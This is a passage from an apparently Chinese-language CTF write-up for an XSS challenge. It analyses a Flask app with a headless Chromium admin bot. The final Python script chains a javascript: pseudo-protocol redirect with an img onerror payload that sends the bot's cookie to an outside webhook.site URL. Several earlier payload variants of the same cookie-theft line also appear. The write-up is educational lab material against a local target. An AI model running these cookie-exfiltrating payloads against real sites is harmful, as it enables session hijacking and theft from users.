+</span></span><span class=line><span class=cl>    <span class=n>h</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>sha256</span><span class=p>((</span><span class=n>challenge</span> <span class=o>+</span> <span class=n>nonce</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>h</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s2>&#34;000000&#34;</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;Invalid PoW&#34;</span><span class=p>,</span> <span class=mi>400</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># No reuse of PoW</span>
+</span></span><span class=line><span class=cl>    <span class=n>session</span><span class=o>.</span><span class=n>pop</span><span class=p>(</span><span class=s1>&#39;challenge&#39;</span><span class=p>,</span> <span class=kc>None</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>session</span><span class=o>.</span><span class=n>pop</span><span class=p>(</span><span class=s1>&#39;ts&#39;</span><span class=p>,</span> <span class=kc>None</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>process</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>([</span><span class=s1>&#39;chromium&#39;</span><span class=p>,</span> <span class=n>url</span><span class=p>,</span> <span class=s1>&#39;--headless&#39;</span><span class=p>,</span> <span class=s1>&#39;--disable-gpu&#39;</span><span class=p>,</span> <span class=s1>&#39;--no-sandbox&#39;</span><span class=p>],</span>
+</span></span><span class=line><span class=cl>                               <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>DEVNULL</span><span class=p>,</span> <span class=n>stderr</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>DEVNULL</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>timer</span> <span class=o>=</span> <span class=n>threading</span><span class=o>.</span><span class=n>Timer</span><span class=p>(</span><span class=mi>20</span><span class=p>,</span> <span class=n>terminate_process</span><span class=p>,</span> <span class=p>[</span><span class=n>process</span><span class=p>])</span>
+</span></span><span class=line><span class=cl>    <span class=n>timer</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s2>&#34;Admin is visiting your page!&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>])</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>request</span><span class=o>.</span><span class=n>remote_addr</span> <span class=o>==</span> <span class=s1>&#39;127.0.0.1&#39;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>resp</span> <span class=o>=</span> <span class=n>make_response</span><span class=p>(</span><span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;index.html&#39;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>        <span class=n>resp</span><span class=o>.</span><span class=n>set_cookie</span><span class=p>(</span><span class=s1>&#39;flag&#39;</span><span class=p>,</span> <span class=n>FLAG</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>resp</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;index.html&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=s1>&#39;0.0.0.0&#39;</span><span class=p>,</span> <span class=n>port</span><span class=o>=</span><span class=mi>5000</span><span class=p>)</span>
+</span></span></code></pre></div></details><p>說明一下 <code>app.py</code> 整體流程:</p><ol><li>首先要去 <code>/get_challenge</code> 拿隨機字串 challenge</li><li>爆破解出符合條件的 nonce (用題目給的 solve_pow.py)</li><li>透過訪問 <code>/visit</code> 取得兩個參數 : url 和 nonce</li><li>檢查條件 :<ol><li>如果沒有 url 或是 nonce 參數，返回: <code>Missing url or nonce</code></li><li>如果 url 不是以 <code>http://localhost:5000/</code> 開頭，返回 : <code>Bad Hacker</code></li><li>如果使用者的 session 有沒有 challenge 或 ts(時間戳)，返回 : <code>No challenge in session. Please request /get_challenge first.</code></li><li>challenge 的有效時間只有 60 秒，若超時則返回 : <code>challenge expired. Please request a new one.</code></li><li>(challenge + nonce) 的 SHA256 雜湊值如果不是以 <code>000000</code> 開頭，返回 : <code>Invalid PoW</code></li></ol></li><li>啟動一個 Chromium 瀏覽器，訪問指定的 url，並且只執行 20 秒，時間到就關閉</li><li>如果是用 Bot 訪問瀏覽器打開 url，就渲染 <code>index.html</code> 這個網頁，並把 flag 設在 cookie 裡面</li></ol><p>再來看一下 <code>index.html</code> 做了甚麼</p><details open><summary>index.html 程式碼</summary><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>script</span><span class=o>&gt;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nx>getQueryParam</span><span class=p>(</span><span class=nx>key</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=kr>const</span> <span class=nx>params</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>URLSearchParams</span><span class=p>(</span><span class=nb>window</span><span class=p>.</span><span class=nx>location</span><span class=p>.</span><span class=nx>search</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=nx>params</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=nx>key</span><span class=p>)</span> <span class=o>||</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>name</span> <span class=o>=</span> <span class=nx>getQueryParam</span><span class=p>(</span><span class=s1>&#39;name&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>targetUrl</span> <span class=o>=</span> <span class=nx>getQueryParam</span><span class=p>(</span><span class=s1>&#39;url&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>display</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;displayName&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nx>display</span><span class=p>.</span><span class=nx>textContent</span> <span class=o>=</span> <span class=nx>name</span> <span class=o>||</span> <span class=s1>&#39;Guest&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nx>setTimeout</span><span class=p>(()</span> <span class=p>=&gt;</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=nx>targetUrl</span> <span class=o>&amp;&amp;</span> <span class=nx>targetUrl</span><span class=p>.</span><span class=nx>length</span><span class=o>&lt;=</span><span class=mi>15</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nb>window</span><span class=p>.</span><span class=nx>location</span><span class=p>.</span><span class=nx>href</span> <span class=o>=</span> <span class=nx>targetUrl</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>},</span> <span class=mi>3000</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>  <span class=o>&lt;</span><span class=err>/script&gt;</span>
+</span></span></code></pre></div></details><p>以上是他的 JS 部分，一樣說明一下做了甚麼</p><ol><li>name 的部分採用 textContent -> 任何的程式碼都會變成純文字<ol><li>例如 : <code>?name=&lt;script>alert(1)&lt;/script></code> 也不會執行</li></ol></li><li>targetUrl 的值是從 url 來的，但長度需要不大於15，會在 3 秒後觸發 redirect</li></ol><hr><p>好了，知道整個頁面怎麼運作了，剩下就是如何打出 xss</p><p>在 <a href=https://blog.huli.tw/2021/09/26/what-is-open-redirect/>在做跳轉功能時應該注意的問題：Open Redirect</a> 這篇文章中看到一個重點 :</p><p><img src=/images/xxs-xss-redirection.png alt=xxs-xss-redirection></p><p>在 <code>index.html</code> 程式碼的第四行 :
+<code>const params = new URLSearchParams(window.location.search);</code></p><h4 id=建構-payload-點-1>建構 payload 點-1</h4><ul><li>有沒有可能改變 <code>window.location</code> 的值，讓他連上外網傳送 cookie?</li></ul><p>接著在 <a href=https://github.com/payloadbox/xss-payload-list>xss-payload-list</a> 裡面看到一個可能有用的 payload :<code>&lt;img src =q onerror=prompt(8)></code></p><h4 id=建構-payload-點-2>建構 payload 點-2</h4><ul><li>把 oneerror 後面那串改成我們的外網連結並加上 document.cookie</li></ul><p><strong>但是要怎麼觸發 oneerror?</strong></p><p><a href=https://aszx87410.github.io/beyond-xss/ch1/javascript-protocol/#%E4%BB%80%E9%BA%BC%E6%98%AF-javascript-%E5%81%BD%E5%8D%94%E8%AD%B0>javascript 偽協議</a> 這篇文章給了我答案</p><h4 id=建構-payload-點-3>建構 payload 點-3</h4><ul><li>url 要以 <code>http://localhost:5000/</code> 開頭，並且加上 <code>url=javascript:name</code>，其中 name 的值就是 oneerror 那段程式碼</li></ul><h4 id=開始嘗試-payload>開始嘗試 payload</h4><p>first_payload =
+<code>&lt;img src=x onerror='location.href=\"{WEBHOOK}/?flag=\"+btoa(document.cookie)'>&amp;url=http://localhost:5000/?url=javascript:name</code></p><p>將這個 payload 透過腳本串接，結果如下圖 :
+<img src=/images/xxs-xss-payload-1.png alt=xxs-xss-payload-1></p><p>欸可是?沒連到外網?</p><p>去看了 container 的 config :
+<img src=/images/xxs-xss-config-1.png alt=xxs-xss-config-1></p><p>在這裡卡很久，一直覺得 url 長度剛好 15 沒超過，為甚麼沒有觸發到 name 的部分??</p><p>於是開始了排列組合遊戲 (好玩愛玩下次不玩了QQ)</p><p>second_payload =
+<code>url=http://localhost:5000/?url=javascript:name&amp;name=&lt;img src=x onerror='location.href=\"{WEBHOOK}/?flag=\"+btoa(document.cookie)'></code></p><p>在經過腳本串接後，得到一樣的回應 和 config :
+<img src=/images/xxs-xss-payload-2.png alt=xxs-xss-payload-2>
+<img src=/images/xxs-xss-config-2.png alt=xxs-xss-config-2></p><p>還是沒連到外網</p><p>在這裡卡了好多天，程式碼看到睡覺還會夢到，超可怕</p><p>最後有幸得到高人指點迷津 :</p><p><img src=/images/xxs-xss-hint.png alt=xxs-xss-hint></p><p><del>很明顯我的排列組合遊戲根本沒有好好玩過一遍</del></p><p>再看一次程式碼，尤其是 <code>app.py</code> 的<code>visit()</code> 函式</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=k>def</span> <span class=nf>visit</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>url</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;url&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>nonce</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;nonce&#39;</span><span class=p>)</span>
+</span></span></code></pre></div><div class=info-box><strong><p>簡單來說，/visit 只有兩個 query string : url 和 nonce，而 name 不會，<del>就算 name 再好看他都視而不見</del>。</p><p>前面兩個 payload Bot 訪問的都是 <code>/?url=javasceript:name</code>，name 的值沒有被 url 帶進去，所以是空的，就算跳轉到 <code>javascript:name</code> 也不會執行</p><p>所以要讓 url 帶進去的參數有 name 的值，一開始就要讓 url 帶上 name，再接 <code>&amp;url=javasceipt:name&amp;nonce={}</code>，<code>request.args.get("url")</code> 會把整段 url 的參數讓 Bot 去訪問，這樣跳轉到 <code>javascript:name</code> 才有意義</strong></p></div><details open><summary>最終 script</summary><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.parse</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>BASE</span> <span class=o>=</span> <span class=s2>&#34;http://localhost:21337&#34;</span>   
+</span></span><span class=line><span class=cl><span class=n>WEBHOOK</span> <span class=o>=</span> <span class=s2>&#34;https://webhook.site/422cda5d-b5d7-4998-8046-fdd591edc79b&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve_pow</span><span class=p>(</span><span class=n>challenge</span><span class=p>,</span> <span class=n>prefix</span><span class=o>=</span><span class=s2>&#34;000000&#34;</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>10000000000</span><span class=p>):</span> 
+</span></span><span class=line><span class=cl>        <span class=n>nonce</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>h</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>sha256</span><span class=p>((</span><span class=n>challenge</span> <span class=o>+</span> <span class=n>nonce</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>h</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=n>prefix</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>nonce</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>None</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>Session</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># 1. 拿 PoW challenge</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>BASE</span><span class=si>}</span><span class=s2>/get_challenge&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>j</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>json</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>challenge</span> <span class=o>=</span> <span class=n>j</span><span class=p>[</span><span class=s2>&#34;challenge&#34;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] Challenge: </span><span class=si>{</span><span class=n>challenge</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># 2. 解 PoW</span>
+</span></span><span class=line><span class=cl>    <span class=n>nonce</span> <span class=o>=</span> <span class=n>solve_pow</span><span class=p>(</span><span class=n>challenge</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>nonce</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Failed to solve PoW&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] Nonce: </span><span class=si>{</span><span class=n>nonce</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># 3. 構造 payload</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=n>encode_payload</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>parse</span><span class=o>.</span><span class=n>quote</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;&lt;img src=x onerror=&#39;location.href=</span><span class=se>\&#34;</span><span class=si>{</span><span class=n>WEBHOOK</span><span class=si>}</span><span class=s2>/?flag=</span><span class=se>\&#34;</span><span class=s2>+btoa(document.cookie)&#39;&gt;&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=n>test_payload</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;http://localhost:5000/?name=</span><span class=si>{</span><span class=n>encode_payload</span><span class=si>}</span><span class=s2>&amp;url=javascript:name&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>encode_test_payload</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>parse</span><span class=o>.</span><span class=n>quote</span><span class=p>(</span><span class=n>test_payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>exploit_url</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>BASE</span><span class=si>}</span><span class=s2>/visit?url=</span><span class=si>{</span><span class=n>encode_test_payload</span><span class=si>}</span><span class=s2>&amp;nonce=</span><span class=si>{</span><span class=n>nonce</span><span class=si>}</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] Exploit URL:</span><span class=se>\n</span><span class=si>{</span><span class=n>exploit_url</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># 4. 發送請求（保持同一個 session）</span>
+</span></span><span class=line><span class=cl>    <span class=n>r2</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>exploit_url</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Response:&#34;</span><span class=p>,</span> <span class=n>r2</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
+</span></span></code></pre></div></details><p><img src=/images/xxs-xss-config-3.png alt=xxs-xss-config-3></p><p>成功訪問外網啦(歡呼~)</p><p>去外網找 flag</p><p><img src=/images/xxs-xss-webhook.png alt=xxs-xss-webhook></p><p>得到一串 base64，解碼就得到 flag 了</p><p>最終訪問的 payload :
+<code>url=http%3A//localhost%3A5000/%3Fname%3D%253Cimg%2520src%253Dx%2520onerror%253D%2527location.href%253D%2522{WEBHOOK}/%253Fflag%253D%2522%252Bbtoa%2528document.cookie%2529%2527%253E%26url%3Djavascript%3Aname&amp;nonce=18235395</code></p><div class=warning-box><strong><p>整個過程原理就是 :</p><p>javascript 偽協議會先執行變數的內容，觸發 oneerror，接著才會渲染頁面(index.html)</p><p>這是 javascript 偽協議特有的特性</p><p>最後總結一下之前卡住的原因 :</p><ol><li>一直覺得 url 的長度不能超過15，所以 <code>/?url=javascript:name</code>，是唯一解</li><li>但其實至少要讓網站可以讀到 name 的值，就算有 textContent 也沒關係，因為 javascript 偽協議會先執行</li></ol></strong></div><h2 id=flag>Flag</h2><div class=flag-box><strong>flag : NHNC{FAKE_FLAG}</strong></div></article></div></div></div></div></div></div></main></div><script type=application/javascript src=https://lyccyc.github.io/penguin.cyc/js/toc.js></script><link rel=stylesheet href=https://lyccyc.github.io/penguin.cyc/css/toc.css></div><div class="footer container-xl width-full p-responsive"><div class="position-relative d-flex flex-row-reverse flex-lg-row flex-wrap flex-lg-nowrap flex-justify-center flex-lg-justify-between flex-sm-items-center pt-6 pb-2 mt-6 f6 text-gray border-top border-gray-light"><a aria-label=Homepage title=GitHub class="footer-octicon d-none d-lg-block mr-lg-4" href=https://lyccyc.github.io/penguin.cyc/><svg height="24" class="octicon octicon-mark-github" viewBox="0 0 16 16" width="24"><path fill-rule="evenodd" d="M8 0C3.58.0.0 3.58.0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38.0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95.0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12.0.0.67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15.0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48.0 1.07-.01 1.93-.01 2.2.0.21.15.46.55.38A8.013 8.013.0 0016 8c0-4.42-3.58-8-8-8z"/></svg></a><ul class="list-style-none d-flex flex-wrap col-12 flex-justify-center flex-lg-justify-between mb-2 mb-lg-0"><li class="mr-3 mr-lg-0">Theme by <a href=https://github.com/MeiK2333/github-style>github-style</a></li><li class="mr-3 mr-lg-0">GitHub and the Invertocat logo are trademarks of <a href=https://github.com/>GitHub, Inc.</a></li></ul></div><div class="d-flex flex-justify-center pb-6"><span class="f6 text-gray-light"></span></div></div></body><script type=application/javascript src=https://lyccyc.github.io/penguin.cyc/js/github-style.js></script></html>
